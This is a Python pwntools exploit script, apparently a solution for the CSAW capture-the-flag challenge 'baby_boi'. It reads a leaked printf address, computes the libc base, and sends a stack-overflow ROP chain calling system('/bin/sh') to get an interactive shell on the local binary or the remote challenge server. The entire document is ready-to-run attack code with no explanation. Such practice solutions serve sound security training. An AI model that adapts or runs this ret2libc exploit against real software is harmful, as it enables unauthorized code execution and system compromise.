#!/usr/bin/env python2

from pwn import *

BINARY = './baby_boi'
HOST, PORT = 'pwn.chal.csaw.io', 1005
context.terminal = ['tmux', 'new-window']

elf = ELF(BINARY)
libc = ELF('./libc-2.27.so')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)

p = start()
if not args.REMOTE and args.GDB:
    debug([0x40072e]) # ret in main

p.recvuntil(': ')

printf_leak = int(p.recvuntil('\n')[:-1], 16)

log.info('printf at: ' + hex(printf_leak))

libc.address = printf_leak - libc.symbols['printf']

log.info('libc base: ' + hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
pop_rdi = libc.address + 0x2155f

log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))
log.info('pop rdi: ' + hex(pop_rdi))

payload = 'A'*40
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)

p.interactive()
